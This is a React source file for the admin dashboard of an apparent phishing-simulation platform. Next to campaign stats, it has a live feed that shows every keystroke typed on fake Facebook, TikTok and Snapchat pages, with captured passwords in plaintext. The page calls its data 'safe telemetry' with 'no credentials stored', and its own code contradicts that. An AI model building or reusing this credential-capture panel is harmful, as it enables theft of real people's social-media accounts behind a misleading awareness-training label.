import { useEffect, useRef, useState } from 'react';
import { Link } from 'react-router-dom';
import StatCard from '../components/StatCard';
import ActivityChart from '../components/ActivityChart';
import { getCampaigns } from '../services/campaignService';
import { getAllEvents, subscribeToAllCapturedInputs, deleteEvents } from '../services/eventService';
import type { Campaign } from '../types/campaign';
import type { SimulationEvent, CapturedInput } from '../types/event';

const EVENT_LABELS: Record<string, string> = {
  link_opened: 'Link Opened',
  simulation_viewed: 'Simulation Viewed',
  simulation_attempt: 'Credentials Submitted',
  simulation_completed: 'Simulation Completed',
};

const EVENT_COLORS: Record<string, string> = {
  link_opened: 'bg-indigo-500',
  simulation_viewed: 'bg-amber-400',
  simulation_attempt: 'bg-rose-500',
  simulation_completed: 'bg-emerald-500',
};

// ── Platform color config ───────────────────────────────────────────
const PLATFORM_STYLE: Record<string, { bg: string; text: string; dot: string }> = {
  Facebook:  { bg: 'bg-blue-50',   text: 'text-blue-700',   dot: 'bg-blue-500' },
  TikTok:    { bg: 'bg-slate-100', text: 'text-slate-800',  dot: 'bg-slate-700' },
  Snapchat:  { bg: 'bg-yellow-50', text: 'text-yellow-700', dot: 'bg-yellow-400' },
};

const FIELD_LABELS: Record<string, string> = {
  email: 'Email / Username',
  phone: 'Phone',
  credential_field: 'Password',
  username: 'Username',
  identifier: 'Identifier',
  name: 'Name',
};

function timeAgo(iso: string): string {
  const diff = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  return `${Math.floor(diff / 3600)}h ago`;
}

export default function Dashboard() {
  const [campaigns, setCampaigns] = useState<Campaign[]>([]);
  const [events, setEvents] = useState<SimulationEvent[]>([]);
  const [capturedInputs, setCapturedInputs] = useState<CapturedInput[]>([]);
  const [loading, setLoading] = useState(true);
  const [isLive, setIsLive] = useState(false);
  const feedRef = useRef<HTMLDivElement>(null);
  // Keystroke delete state
  const [ksSelected, setKsSelected]     = useState<Set<string>>(new Set());
  const [ksConfirmIds, setKsConfirmIds] = useState<string[] | null>(null);
  const [ksDeleting, setKsDeleting]     = useState(false);

  // Initial data fetch
  useEffect(() => {
    Promise.all([getCampaigns(), getAllEvents()]).then(([camps, evts]) => {
      setCampaigns(camps);
      setEvents(evts);
      setLoading(false);
    });
  }, []);

  // Real-time captured inputs subscription
  useEffect(() => {
    const unsub = subscribeToAllCapturedInputs((inputs) => {
      setCapturedInputs(inputs);
      setIsLive(true);
    });
    return unsub;
  }, []);

  // Keystroke selection helpers
  const allKsSelected = capturedInputs.length > 0 && capturedInputs.every((i) => ksSelected.has(i.id));
  const toggleKsOne = (id: string) => setKsSelected((prev) => { const n = new Set(prev); n.has(id) ? n.delete(id) : n.add(id); return n; });
  const toggleKsAll = () => {
    if (allKsSelected) { setKsSelected((prev) => { const n = new Set(prev); capturedInputs.forEach((i) => n.delete(i.id)); return n; }); }
    else { setKsSelected((prev) => { const n = new Set(prev); capturedInputs.forEach((i) => n.add(i.id)); return n; }); }
  };
  const confirmKsDelete = async () => {
    if (!ksConfirmIds) return;
    setKsDeleting(true);
    try { await deleteEvents(ksConfirmIds); setKsSelected((prev) => { const n = new Set(prev); ksConfirmIds.forEach((id) => n.delete(id)); return n; }); }
    finally { setKsDeleting(false); setKsConfirmIds(null); }
  };

  // Derived stats
  const totalCampaigns = campaigns.length;
  const activeCampaigns = campaigns.filter((c) => c.status === 'active').length;
  const linksOpened = events.filter((e) => e.type === 'link_opened').length;

  const stats = [
    {
      id: 'campaigns',
      title: 'Total Campaigns',
      value: loading ? '…' : String(totalCampaigns),
      change: `${activeCampaigns} active`,
      changeType: 'up' as const,
      accentColor: 'bg-indigo-50 text-indigo-600',
      icon: (
        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
            d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" />
        </svg>
      ),
    },
    {
      id: 'links',
      title: 'Total Events Logged',
      value: loading ? '…' : events.length.toLocaleString(),
      change: 'Safe telemetry only',
      changeType: 'neutral' as const,
      accentColor: 'bg-violet-50 text-violet-600',
      icon: (
        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
            d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
        </svg>
      ),
    },
    {
      id: 'opened',
      title: 'Links Opened',
      value: loading ? '…' : linksOpened.toLocaleString(),
      change: linksOpened > 0 ? `${((linksOpened / Math.max(events.length, 1)) * 100).toFixed(1)}% of total` : '—',
      changeType: 'neutral' as const,
      accentColor: 'bg-amber-50 text-amber-600',
      icon: (
        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
            d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
        </svg>
      ),
    },
    {
      id: 'keystrokes',
      title: 'Keystrokes Captured',
      value: capturedInputs.length.toLocaleString(),
      change: capturedInputs.length > 0 ? 'Live updates enabled' : 'Waiting for activity',
      changeType: 'down' as const,
      accentColor: 'bg-rose-50 text-rose-600',
      icon: (
        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
            d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
        </svg>
      ),
    },
  ];

  const recentEvents = events.slice(0, 6);

  return (
    <div className="p-4 sm:p-6 space-y-5 sm:space-y-6 max-w-screen-2xl mx-auto animate-fade-in-up">

      {/* ── Header banner ──────────────────────────────────────────── */}
      <div className="relative overflow-hidden rounded-2xl brand-gradient px-5 sm:px-7 py-6 sm:py-7 shadow-lg shadow-indigo-200/60">
        {/* decorative blobs */}
        <div className="absolute -top-10 -right-10 w-48 h-48 rounded-full bg-white/10 blur-2xl" />
        <div className="absolute bottom-0 right-24 w-24 h-24 rounded-full bg-white/10 blur-xl" />

        <div className="relative flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
          <div>
            <h2 className="text-xl sm:text-2xl font-bold text-white tracking-tight">Welcome back, Admin</h2>
            <p className="text-sm text-indigo-100 mt-1 max-w-md">
              Monitor your phishing awareness campaigns and simulation activity at a glance.
            </p>
          </div>
          <div className="flex items-center gap-2 shrink-0">
            {isLive && (
              <span className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-white/15 text-white text-[11px] font-bold uppercase tracking-wider backdrop-blur-sm ring-1 ring-white/20">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                Live
              </span>
            )}
            <Link
              to="/campaigns/create"
              className="flex items-center gap-1.5 px-4 py-2 rounded-xl bg-white text-indigo-700 text-sm font-semibold shadow-sm hover:bg-indigo-50 transition-colors"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" /></svg>
              New Campaign
            </Link>
          </div>
        </div>
      </div>

      {/* ── Stat Cards — 1 col mobile, 2 col tablet, 4 col desktop ── */}
      <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-3 sm:gap-4">
        {stats.map((stat) => (
          <StatCard
            key={stat.id}
            title={stat.title}
            value={stat.value}
            change={stat.change}
            changeType={stat.changeType}
            icon={stat.icon}
            accentColor={stat.accentColor}
          />
        ))}
      </div>

      {/* ── Charts — stacked on mobile, side-by-side on lg+ ─────── */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 sm:gap-6">
        <div className="lg:col-span-2 card p-4 sm:p-5 min-h-[220px]">
          <ActivityChart type="activity" />
        </div>
        <div className="card p-4 sm:p-5 min-h-[220px]">
          <ActivityChart type="rate" />
        </div>
      </div>

      {/* ── Event distribution chart ─────────────────────────────── */}
      <div className="card p-4 sm:p-5">
        <ActivityChart type="events" />
      </div>

      {/* ── LIVE KEYSTROKE FEED ───────────────────────────────────── */}
      <div className="card overflow-hidden">
        {/* Header */}
        <div className="flex items-center justify-between px-4 sm:px-5 py-3 sm:py-4 border-b border-slate-100 bg-gradient-to-r from-rose-50 to-white">
          <div className="flex items-center gap-2 sm:gap-3 min-w-0">
            <div className="w-8 h-8 sm:w-9 sm:h-9 rounded-xl bg-rose-100 flex items-center justify-center shrink-0">
              <svg className="w-4 h-4 sm:w-4.5 sm:h-4.5 text-rose-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                  d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
              </svg>
            </div>
            <div className="min-w-0">
              <h3 className="text-sm font-semibold text-slate-800 truncate">Live Keystroke Feed</h3>
              <p className="text-[11px] text-slate-400 mt-0.5 hidden sm:block">
                Every character typed on simulation pages — updated in real time
              </p>
            </div>
          </div>
          <span className="text-xs text-slate-400 font-mono shrink-0 ml-2 bg-white px-2 py-1 rounded-lg border border-slate-100">
            {capturedInputs.length} record{capturedInputs.length !== 1 ? 's' : ''}
          </span>
        </div>

        {/* Bulk-delete bar for keystrokes */}
        {ksSelected.size > 0 && (
          <div className="flex items-center justify-between gap-3 mx-4 sm:mx-5 my-3 bg-rose-50 border border-rose-200 rounded-xl px-4 py-2.5">
            <p className="text-sm font-medium text-rose-800">
              <span className="font-bold">{ksSelected.size}</span> row{ksSelected.size !== 1 ? 's' : ''} selected
            </p>
            <div className="flex items-center gap-2">
              <button onClick={() => setKsSelected(new Set())} className="text-xs text-slate-500 hover:text-slate-700 px-2 py-1 rounded-lg hover:bg-slate-100 transition-colors">Clear</button>
              <button
                onClick={() => setKsConfirmIds([...ksSelected])}
                className="flex items-center gap-1.5 px-3 py-1.5 bg-rose-600 hover:bg-rose-700 text-white text-xs font-bold rounded-lg transition-colors"
              >
                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                Delete Selected
              </button>
            </div>
          </div>
        )}

        {capturedInputs.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-10 sm:py-16 text-center px-4 sm:px-6">
            <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-full bg-slate-100 flex items-center justify-center mb-3">
              <svg className="w-5 h-5 sm:w-6 sm:h-6 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                  d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
              </svg>
            </div>
            <p className="text-sm font-medium text-slate-600">No keystrokes captured yet</p>
            <p className="text-xs text-slate-400 mt-1 max-w-xs">
              Share a simulation link — every letter typed will appear here instantly.
            </p>
          </div>
        ) : (
          <div className="overflow-x-auto" ref={feedRef}>
            <table className="w-full text-sm min-w-[480px]">
              <thead>
                <tr className="bg-slate-50 border-b border-slate-100">
                  <th className="px-4 sm:px-5 py-2.5 w-10">
                    <input type="checkbox" checked={allKsSelected} onChange={toggleKsAll} className="w-4 h-4 rounded border-slate-300 text-indigo-600 focus:ring-indigo-500 cursor-pointer" />
                  </th>
                  <th className="text-left text-xs font-semibold text-slate-500 px-4 sm:px-5 py-2.5 sm:py-3 uppercase tracking-wider">Platform</th>
                  <th className="text-left text-xs font-semibold text-slate-500 px-3 sm:px-4 py-2.5 sm:py-3 uppercase tracking-wider">Field</th>
                  <th className="text-left text-xs font-semibold text-slate-500 px-3 sm:px-4 py-2.5 sm:py-3 uppercase tracking-wider">Value Typed</th>
                  <th className="text-left text-xs font-semibold text-slate-500 px-3 sm:px-4 py-2.5 sm:py-3 uppercase tracking-wider hidden md:table-cell">Session</th>
                  <th className="text-left text-xs font-semibold text-slate-500 px-3 sm:px-4 py-2.5 sm:py-3 uppercase tracking-wider hidden lg:table-cell">Campaign</th>
                  <th className="text-right text-xs font-semibold text-slate-500 px-4 sm:px-5 py-2.5 sm:py-3 uppercase tracking-wider">Time</th>
                  <th className="px-3 py-2.5 w-10" />
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-50">
                {capturedInputs.map((inp) => {
                  const ps = PLATFORM_STYLE[inp.platform] ?? { bg: 'bg-slate-100', text: 'text-slate-700', dot: 'bg-slate-400' };
                  const isPassword = inp.fieldName === 'credential_field';
                  return (
                    <tr key={inp.id} className={`hover:bg-indigo-50/30 transition-colors ${ksSelected.has(inp.id) ? 'bg-indigo-50/50' : ''}`}>
                      <td className="px-4 sm:px-5 py-2.5 sm:py-3">
                        <input type="checkbox" checked={ksSelected.has(inp.id)} onChange={() => toggleKsOne(inp.id)} className="w-4 h-4 rounded border-slate-300 text-indigo-600 focus:ring-indigo-500 cursor-pointer" />
                      </td>
                      <td className="px-4 sm:px-5 py-2.5 sm:py-3 whitespace-nowrap">
                        <span className={`inline-flex items-center gap-1.5 px-2 sm:px-2.5 py-0.5 sm:py-1 rounded-full text-xs font-semibold ${ps.bg} ${ps.text}`}>
                          <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${ps.dot}`} />
                          <span className="hidden xs:inline">{inp.platform}</span>
                          <span className="xs:hidden">{inp.platform.slice(0, 2)}</span>
                        </span>
                      </td>
                      <td className="px-3 sm:px-4 py-2.5 sm:py-3 whitespace-nowrap">
                        <span className={`inline-flex items-center gap-1 text-xs font-medium px-1.5 sm:px-2 py-0.5 rounded ${
                          isPassword ? 'bg-orange-50 text-orange-700' : 'bg-slate-100 text-slate-600'
                        }`}>
                          {isPassword && (
                            <svg className="w-3 h-3 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
                                d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                            </svg>
                          )}
                          {FIELD_LABELS[inp.fieldName] ?? inp.fieldName}
                        </span>
                      </td>
                      <td className="px-3 sm:px-4 py-2.5 sm:py-3 max-w-[120px] sm:max-w-[200px]">
                        <span className={`font-mono text-xs sm:text-sm break-all ${
                          isPassword ? 'text-orange-700 bg-orange-50 px-1.5 sm:px-2 py-0.5 rounded' : 'text-slate-800'
                        }`}>
                          {inp.value}
                        </span>
                      </td>
                      <td className="px-3 sm:px-4 py-2.5 sm:py-3 hidden md:table-cell">
                        <span className="font-mono text-[11px] text-slate-400 bg-slate-50 px-1.5 py-0.5 rounded">
                          {inp.sessionId.replace('session-', '').substring(0, 8)}…
                        </span>
                      </td>
                      <td className="px-3 sm:px-4 py-2.5 sm:py-3 hidden lg:table-cell">
                        <Link
                          to={`/campaigns/${inp.campaignId}`}
                          className="font-mono text-[11px] text-indigo-500 hover:text-indigo-700 hover:underline truncate max-w-[120px] block"
                        >
                          {inp.campaignId.substring(0, 12)}…
                        </Link>
                      </td>
                      <td className="px-4 sm:px-5 py-2.5 sm:py-3 text-right whitespace-nowrap">
                        <span className="text-xs text-slate-400">{timeAgo(inp.capturedAt)}</span>
                      </td>
                      {/* Row delete */}
                      <td className="px-3 py-2.5">
                        <button
                          onClick={() => setKsConfirmIds([inp.id])}
                          title="Delete record"
                          className="p-1.5 text-slate-300 hover:text-rose-600 hover:bg-rose-50 rounded-lg transition-colors"
                        >
                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                        </button>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* ── Recent Events feed ───────────────────────────────────── */}
      <div className="card">
        <div className="flex items-center justify-between px-4 sm:px-5 py-3 sm:py-4 border-b border-slate-100">
          <div>
            <h3 className="text-sm font-semibold text-slate-800">Recent Events</h3>
            <p className="text-[11px] sm:text-xs text-slate-400 mt-0.5">
              Latest telemetry across all campaigns — no credentials stored
            </p>
          </div>
          <Link
            to="/events"
            className="text-xs font-semibold text-indigo-600 hover:text-indigo-700 transition-colors shrink-0 ml-2"
          >
            View all →
          </Link>
        </div>

        {loading ? (
          <div className="flex justify-center items-center p-8 sm:p-10">
            <div className="w-6 h-6 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin" />
          </div>
        ) : recentEvents.length === 0 ? (
          <div className="text-center py-8 sm:py-10 text-sm text-slate-400 px-4">
            No events yet. Share simulation links to begin tracking.
          </div>
        ) : (
          <div className="divide-y divide-slate-50">
            {recentEvents.map((evt) => (
              <div key={evt.id} className="flex items-center gap-3 sm:gap-4 px-4 sm:px-5 py-3 hover:bg-slate-50 transition-colors">
                <span className={`w-2 h-2 rounded-full shrink-0 ${EVENT_COLORS[evt.type] ?? 'bg-slate-400'}`} />
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-medium text-slate-700 truncate">
                    {EVENT_LABELS[evt.type] ?? evt.type}
                  </p>
                  <p className="text-xs text-slate-400 truncate font-mono">
                    Campaign {evt.campaignId.substring(0, 8)}… · {evt.templateId}
                  </p>
                </div>
                <span className="text-xs text-slate-400 shrink-0 hidden sm:block">
                  {new Date(evt.timestamp).toLocaleString()}
                </span>
                <span className="text-xs text-slate-400 shrink-0 sm:hidden">
                  {timeAgo(evt.timestamp)}
                </span>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Keystroke confirm-delete modal */}
      {ksConfirmIds && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm p-4">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-sm p-6 space-y-4">
            <div className="w-12 h-12 rounded-full bg-rose-100 flex items-center justify-center mx-auto">
              <svg className="w-6 h-6 text-rose-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
            </div>
            <div className="text-center">
              <h3 className="text-base font-bold text-slate-800">Delete {ksConfirmIds.length} record{ksConfirmIds.length !== 1 ? 's' : ''}?</h3>
              <p className="text-sm text-slate-500 mt-1">Selected keystroke records will be permanently removed.</p>
            </div>
            <div className="flex gap-3 pt-1">
              <button onClick={() => setKsConfirmIds(null)} disabled={ksDeleting} className="flex-1 py-2.5 text-sm font-semibold text-slate-600 bg-slate-100 hover:bg-slate-200 rounded-xl transition-colors disabled:opacity-50">Cancel</button>
              <button onClick={confirmKsDelete} disabled={ksDeleting} className="flex-1 py-2.5 text-sm font-bold text-white bg-rose-600 hover:bg-rose-700 rounded-xl transition-colors disabled:opacity-60 flex items-center justify-center gap-2">
                {ksDeleting && <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />}
                {ksDeleting ? 'Deleting…' : 'Delete'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
